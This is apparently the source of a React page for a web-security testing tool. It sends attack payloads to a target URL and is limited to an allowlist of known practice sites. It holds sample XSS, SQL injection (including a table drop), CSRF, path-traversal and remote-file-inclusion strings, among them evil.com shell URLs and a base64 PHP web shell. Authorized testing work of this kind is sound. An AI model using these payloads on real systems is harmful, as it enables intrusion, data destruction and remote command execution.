'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { auth } from '@/lib/auth';
import { apiClient } from '@/lib/api';
import Navbar from '@/components/Navbar';
import Sidebar from '@/components/Sidebar';
import { Zap, Globe, Code, AlertTriangle, CheckCircle, XCircle, Loader, Info, Shield } from 'lucide-react';

interface PayloadResult {
  payload_type: string;
  target_url: string;
  payload: string;
  success: boolean;
  response: {
    status_code: number;
    response_time: string;
    content_length: number;
    headers: Record<string, string>;
    vulnerability_detected?: boolean;
    evidence?: string;
    risk_level?: string;
    recommendation?: string;
    protection?: string;
    database_type?: string;
  };
  timestamp: string;
}

const payloadTypes = [
  { value: 'xss', label: 'Cross-Site Scripting (XSS)', color: 'red' },
  { value: 'sqli', label: 'SQL Injection', color: 'orange' },
  { value: 'csrf', label: 'Cross-Site Request Forgery', color: 'yellow' },
  { value: 'lfi', label: 'Local File Inclusion', color: 'purple' },
  { value: 'rfi', label: 'Remote File Inclusion', color: 'blue' }
];

const samplePayloads = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><script>alert("XSS")</script>'
  ],
  sqli: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null,null,null--",
    "admin'--"
  ],
  csrf: [
    '<form action="/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>',
    '<img src="/delete?id=1" width="0" height="0">',
    '<iframe src="/admin/delete_user?id=1" width="0" height="0"></iframe>'
  ],
  lfi: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd%00',
    'php://filter/read=string.rot13/resource=index.php'
  ],
  rfi: [
    'http://evil.com/shell.txt',
    'ftp://evil.com/shell.php',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
    'expect://id'
  ]
};

const authorizedDomains = [
  'localhost',
  '127.0.0.1',
  'testphp.vulnweb.com',
  'demo.testfire.net',
  'zero.webappsecurity.com',
  'juice-shop.herokuapp.com',
  'dvwa.local',
  'metasploitable.local',
  'vulnweb.com',
  'bwapp.local'
];

export default function PayloadTesting() {
  const [payloadType, setPayloadType] = useState('xss');
  const [targetUrl, setTargetUrl] = useState('');
  const [payload, setPayload] = useState('');
  const [isTesting, setIsTesting] = useState(false);
  const [testResult, setTestResult] = useState<PayloadResult | null>(null);
  const [error, setError] = useState('');
  const [validationError, setValidationError] = useState('');
  const [urlValidationError, setUrlValidationError] = useState('');
  const router = useRouter();

  useEffect(() => {
    if (!auth.isAuthenticated()) {
      router.push('/login');
    }
    
    // Load previous test results from localStorage on component mount
    const savedResult = localStorage.getItem('lastPayloadResult');
    if (savedResult) {
      try {
        const parsedResult = JSON.parse(savedResult);
        setTestResult(parsedResult);
      } catch (e) {
        console.error('Error loading saved payload result:', e);
      }
    }
  }, [router]);

  useEffect(() => {
    // Set default payload when type changes
    const samples = samplePayloads[payloadType as keyof typeof samplePayloads];
    if (samples && samples.length > 0) {
      setPayload(samples[0]);
    }
  }, [payloadType]);

  const validateUrl = (url: string): boolean => {
    if (!url.trim()) return false;
    
    try {
      const urlObj = new URL(url.startsWith('http') ? url : `http://${url}`);
      const hostname = urlObj.hostname.toLowerCase();
      
      // Check if hostname matches any authorized domain
      return authorizedDomains.some(domain => {
        if (hostname === domain) return true;
        if (hostname.endsWith(`.${domain}`)) return true;
        return false;
      });
    } catch {
      return false;
    }
  };

  const handleUrlChange = (newUrl: string) => {
    setTargetUrl(newUrl);
    setValidationError('');
    setError('');
    setUrlValidationError('');
    
    if (newUrl.trim() && !validateUrl(newUrl)) {
      setUrlValidationError('❌ Unauthorized domain. Please use only approved testing sites listed below.');
    }
  };

  const handleTest = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    
    // Validation checks
    if (!targetUrl.trim()) {
      setValidationError('Please enter a target URL');
      setError('');
      return;
    }
    
    if (!validateUrl(targetUrl)) {
      setUrlValidationError('❌ Unauthorized domain. Please use only approved testing sites.');
      setValidationError('');
      setError('');
      return;
    }
    
    if (!payload.trim()) {
      setValidationError('Please enter a payload to test');
      setError('');
      return;
    }

    setError('');
    setValidationError('');
    setUrlValidationError('');
    setIsTesting(true);
    setTestResult(null);

    try {
      const response = await apiClient.testPayload(payloadType, targetUrl, payload);
      const result = response.data;
      setTestResult(result);
      
      // Save test result to localStorage
      localStorage.setItem('lastPayloadResult', JSON.stringify(result));
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Payload test failed. Please try again.');
    } finally {
      setIsTesting(false);
    }
  };

  const handleClearUrl = () => {
    setTargetUrl('');
    setValidationError('');
    setError('');
    setUrlValidationError('');
  };

  const handleClearPayload = () => {
    setPayload('');
    setValidationError('');
    setError('');
  };

  const loadSamplePayload = (samplePayload: string) => {
    setPayload(samplePayload);
    setValidationError('');
    setError('');
  };

  const getRiskLevelColor = (level: string) => {
    switch (level?.toLowerCase()) {
      case 'critical':
        return 'text-red-400 bg-red-400/10';
      case 'high':
        return 'text-orange-400 bg-orange-400/10';
      case 'medium':
        return 'text-yellow-400 bg-yellow-400/10';
      case 'low':
        return 'text-green-400 bg-green-400/10';
      default:
        return 'text-gray-400 bg-gray-400/10';
    }
  };

  const getStatusColor = (status: number) => {
    if (status >= 200 && status < 300) return 'text-green-400';
    if (status >= 400 && status < 500) return 'text-yellow-400';
    if (status >= 500) return 'text-red-400';
    return 'text-gray-400';
  };

  return (
    <div className="min-h-screen bg-gray-900">
      <Navbar />
      <div className="flex">
        <Sidebar />
        <div className="md:pl-64 flex flex-col flex-1">
          <main className="flex-1">
            <div className="py-8">
              <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
                {/* Header */}
                <div className="mb-8 text-center">
                  <div className="flex items-center justify-center space-x-3 mb-4">
                    <Zap 
                      className="h-8 w-8" 
                      style={{ color: '#dc2626', filter: 'drop-shadow(0 0 10px #dc2626)' }} 
                    />
                    <h1 
                      className="text-3xl font-bold" 
                      style={{ color: '#dc2626', textShadow: '0 0 10px #dc2626' }}
                    >
                      Payload Testing
                    </h1>
                  </div>
                  <p className="text-gray-400 text-lg max-w-3xl mx-auto">
                    Test various attack payloads including XSS, SQL Injection, CSRF, and file inclusion attacks 
                    to identify web application vulnerabilities and security weaknesses.
                  </p>
                </div>

                {/* Legal Notice & Authorized Sites */}
                <div className="mb-10 bg-gradient-to-br from-red-900/20 to-red-800/10 border-2 border-red-500/30 rounded-xl p-8">
                  <div className="flex items-center space-x-3 mb-4">
                    <AlertTriangle className="h-6 w-6 text-red-400" />
                    <h2 className="text-xl font-bold text-red-300">⚖️ LEGAL TESTING ONLY</h2>
                  </div>
                  <div className="text-red-100 mb-6">
                    <p className="font-semibold mb-2">🚨 This tool is restricted to authorized testing domains only!</p>
                    <p className="text-sm">Testing against unauthorized websites is illegal and may result in criminal charges.</p>
                  </div>
                  
                  <div className="bg-green-900/30 border-2 border-green-500/30 rounded-lg" style={{ padding: '32px' }}>
                    <h3 className="font-semibold text-green-200" style={{ marginBottom: '24px' }}>✅ APPROVED TESTING SITES:</h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 text-green-100">
                      <div>
                        <h4 className="font-medium text-green-200" style={{ marginBottom: '16px' }}>Public Test Sites:</h4>
                        <ul className="space-y-3 text-sm">
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">testphp.vulnweb.com</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">demo.testfire.net</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">zero.webappsecurity.com</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">juice-shop.herokuapp.com</code></li>
                        </ul>
                      </div>
                      <div>
                        <h4 className="font-medium text-green-200" style={{ marginBottom: '16px' }}>Local Lab Environments:</h4>
                        <ul className="space-y-3 text-sm">
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">localhost</code> (any port)</li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">127.0.0.1</code> (any port)</li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">dvwa.local</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">metasploitable.local</code></li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Test Form */}
                <div className="bg-gray-800 shadow-xl rounded-xl p-8 mb-10">
                  <div className="flex flex-col items-center space-y-0">
                    {/* Payload Type Selection */}
                    <div style={{ marginBottom: '32px', width: '100%', maxWidth: '600px' }}>
                      <label 
                        className="block font-bold text-white text-center" 
                        style={{ 
                          fontSize: '32px',
                          marginBottom: '24px',
                          color: 'white'
                        }}
                      >
                        Payload Type
                      </label>
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3" style={{ gap: '16px' }}>
                        {payloadTypes.map((type) => (
                          <label key={type.value} className="relative">
                            <input
                              type="radio"
                              name="payloadType"
                              value={type.value}
                              checked={payloadType === type.value}
                              onChange={(e) => setPayloadType(e.target.value)}
                              className="sr-only"
                            />
                            <div 
                              className={`cursor-pointer rounded-lg border-2 transition-colors text-center ${
                                payloadType === type.value
                                  ? 'bg-red-600 border-red-500 text-white'
                                  : 'border-gray-600 bg-gray-700 hover:border-gray-500 text-gray-300'
                              }`}
                              style={{ padding: '16px' }}
                            >
                              <div className="text-sm font-medium">{type.label}</div>
                              <div className="text-xs uppercase" style={{ marginTop: '4px' }}>{type.value}</div>
                            </div>
                          </label>
                        ))}
                      </div>
                    </div>

                    {/* Target URL */}
                    <div style={{ marginBottom: '16px' }}>
                      <label htmlFor="targetUrl" className="block text-lg font-bold text-white text-center" style={{ marginBottom: '12px' }}>
                        Target URL
                      </label>
                      <div 
                        className="relative rounded-xl bg-gray-700 focus-within:ring-2 focus-within:ring-red-500 transition-all duration-300"
                        style={{ 
                          width: '350px',
                          height: '50px',
                          margin: '0 auto',
                          border: '2px solid #4b5563'
                        }}
                      >
                        <div 
                          className="absolute flex items-center pointer-events-none"
                          style={{
                            top: '50%',
                            left: '12px',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <Globe className="h-5 w-5 text-gray-400" />
                        </div>
                        
                        {/* Clear button for URL */}
                        {targetUrl && (
                          <button
                            type="button"
                            onClick={handleClearUrl}
                            className="absolute flex items-center justify-center rounded-full bg-gray-600 hover:bg-gray-500 transition-colors duration-200"
                            style={{
                              top: '50%',
                              right: '8px',
                              transform: 'translateY(-50%)',
                              width: '20px',
                              height: '20px'
                            }}
                          >
                            <span className="text-white text-sm font-bold" style={{ lineHeight: '1' }}>×</span>
                          </button>
                        )}
                        
                        <input
                          type="url"
                          id="targetUrl"
                          value={targetUrl}
                          onChange={(e) => handleUrlChange(e.target.value)}
                          className={`text-white placeholder-gray-400 focus:outline-none bg-transparent rounded-xl transition-all duration-300 ${
                            urlValidationError ? 'ring-2 ring-red-500' : ''
                          }`}
                          style={{ 
                            width: '350px',
                            height: '50px',
                            paddingLeft: '40px',
                            paddingRight: targetUrl ? '36px' : '12px',
                            fontSize: '14px',
                            textAlign: 'center',
                            border: 'none',
                            backgroundColor: 'transparent'
                          }}
                          placeholder="http://testphp.vulnweb.com/artists.php"
                        />
                      </div>
                    </div>

                    {/* Payload Input */}
                    <div style={{ marginBottom: '16px' }}>
                      <label htmlFor="payload" className="block text-lg font-bold text-white text-center" style={{ marginBottom: '12px' }}>
                        Payload
                      </label>
                      <div 
                        className="relative rounded-xl bg-gray-700 focus-within:ring-2 focus-within:ring-red-500 transition-all duration-300"
                        style={{ 
                          width: '350px',
                          height: '60px',
                          margin: '0 auto',
                          border: '2px solid #4b5563'
                        }}
                      >
                        <div 
                          className="absolute flex items-center pointer-events-none"
                          style={{
                            top: '12px',
                            left: '12px'
                          }}
                        >
                          <Code className="h-5 w-5 text-gray-400" />
                        </div>
                        
                        {/* Clear button for Payload */}
                        {payload && (
                          <button
                            type="button"
                            onClick={handleClearPayload}
                            className="absolute flex items-center justify-center rounded-full bg-gray-600 hover:bg-gray-500 transition-colors duration-200"
                            style={{
                              top: '8px',
                              right: '8px',
                              width: '20px',
                              height: '20px'
                            }}
                          >
                            <span className="text-white text-sm font-bold" style={{ lineHeight: '1' }}>×</span>
                          </button>
                        )}
                        
                        <textarea
                          id="payload"
                          value={payload}
                          onChange={(e) => {
                            setPayload(e.target.value);
                            setValidationError('');
                            setError('');
                          }}
                          className="text-white placeholder-gray-400 focus:outline-none bg-transparent rounded-xl transition-all duration-300 resize-none"
                          style={{ 
                            width: '350px',
                            height: '60px',
                            paddingLeft: '40px',
                            paddingRight: payload ? '36px' : '12px',
                            paddingTop: '12px',
                            paddingBottom: '12px',
                            fontSize: '13px',
                            border: 'none',
                            backgroundColor: 'transparent',
                            fontFamily: 'monospace'
                          }}
                          placeholder="Enter your payload here..."
                        />
                      </div>
                    </div>

                    {/* URL Validation Error */}
                    {urlValidationError && (
                      <div 
                        className="bg-red-900/50 border border-red-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-start">
                          <AlertTriangle className="h-4 w-4 text-red-400 mr-2 mt-0.5 flex-shrink-0" />
                          <div>
                            <p className="text-xs text-red-300 font-semibold mb-1">{urlValidationError}</p>
                            <p className="text-xs text-red-200">Use approved sites like: testphp.vulnweb.com</p>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* General Validation Error */}
                    {validationError && !urlValidationError && (
                      <div 
                        className="bg-orange-900/50 border border-orange-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-center">
                          <AlertTriangle className="h-4 w-4 text-orange-400 mr-2" />
                          <p className="text-xs text-orange-300">{validationError}</p>
                        </div>
                      </div>
                    )}

                    {/* API Error */}
                    {error && (
                      <div 
                        className="bg-red-900/50 border border-red-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-center">
                          <AlertTriangle className="h-4 w-4 text-red-400 mr-2" />
                          <p className="text-xs text-red-300">{error}</p>
                        </div>
                      </div>
                    )}

                    <div 
                      style={{ marginTop: '8px' }}
                      className={urlValidationError ? 'opacity-50 pointer-events-none' : ''}
                    >
                      <button
                        type="submit"
                        disabled={isTesting || !!urlValidationError}
                        onClick={handleTest}
                        className="inline-flex items-center justify-center font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
                        style={{ 
                          backgroundColor: urlValidationError ? '#6b7280' : '#dc2626',
                          color: 'white',
                          border: 'none',
                          padding: '12px 24px',
                          fontSize: '16px',
                          minWidth: '160px'
                        }}
                        onMouseEnter={(e) => {
                          if (!isTesting && !urlValidationError) e.currentTarget.style.backgroundColor = '#b91c1c';
                        }}
                        onMouseLeave={(e) => {
                          if (!isTesting && !urlValidationError) e.currentTarget.style.backgroundColor = '#dc2626';
                        }}
                      >
                        {isTesting ? (
                          <>
                            <Loader className="animate-spin -ml-1 mr-2 h-5 w-5" />
                            Testing...
                          </>
                        ) : urlValidationError ? (
                          <>
                            <AlertTriangle className="-ml-1 mr-2 h-5 w-5" />
                            Unauthorized
                          </>
                        ) : (
                          <>
                            <Zap className="-ml-1 mr-2 h-5 w-5" />
                            Test Payload
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </div>

                {/* Sample Payloads */}
                <div className="bg-gray-800 shadow-lg rounded-lg p-4 mb-6">
                  <h3 className="text-md font-bold text-white mb-3 text-center">Sample Payloads</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    {samplePayloads[payloadType as keyof typeof samplePayloads]?.slice(0, 4).map((sample, index) => (
                      <button
                        key={index}
                        onClick={() => loadSamplePayload(sample)}
                        className="text-left p-2 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                      >
                        <code className="text-xs text-green-400 break-all">{sample}</code>
                      </button>
                    ))}
                  </div>
                  
                  <div className="mt-3 p-2 bg-blue-900/30 border border-blue-500/30 rounded-md">
                    <div className="flex">
                      <Info className="h-4 w-4 text-blue-400 mt-0.5 mr-2 flex-shrink-0" />
                      <p className="text-xs text-blue-300">
                        Click any sample to load it. Only test on authorized systems.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Test Results */}
                {testResult && (
                  <div className="space-y-8">
                    {/* Result Summary */}
                    <div className="bg-gray-800 shadow-xl rounded-xl p-6">
                      <div className="flex items-center justify-between mb-6">
                        <h2 className="text-2xl font-bold text-white">Test Results</h2>
                        <div className="flex items-center space-x-2">
                          {testResult.success ? (
                            <>
                              <CheckCircle className="h-6 w-6 text-green-400" />
                              <span className="text-green-400 font-semibold">VULNERABLE</span>
                            </>
                          ) : (
                            <>
                              <XCircle className="h-6 w-6 text-red-400" />
                              <span className="text-red-400 font-semibold">NOT VULNERABLE</span>
                            </>
                          )}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Status Code</p>
                          <p className={`text-lg font-semibold ${getStatusColor(testResult.response.status_code)}`}>
                            {testResult.response.status_code}
                          </p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Response Time</p>
                          <p className="text-lg font-semibold text-white">{testResult.response.response_time}</p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Content Length</p>
                          <p className="text-lg font-semibold text-white">{testResult.response.content_length} bytes</p>
                        </div>
                        
                        {testResult.response.risk_level && (
                          <div className="bg-gray-700 rounded-xl p-4">
                            <p className="text-sm text-gray-400">Risk Level</p>
                            <span className={`inline-flex px-3 py-1 text-sm font-semibold rounded-full ${getRiskLevelColor(testResult.response.risk_level)}`}>
                              {testResult.response.risk_level.toUpperCase()}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Additional result sections would go here */}
                  </div>
                )}
              </div>
            </div>
          </main>
        </div>
      </div>
    </div>
  );
}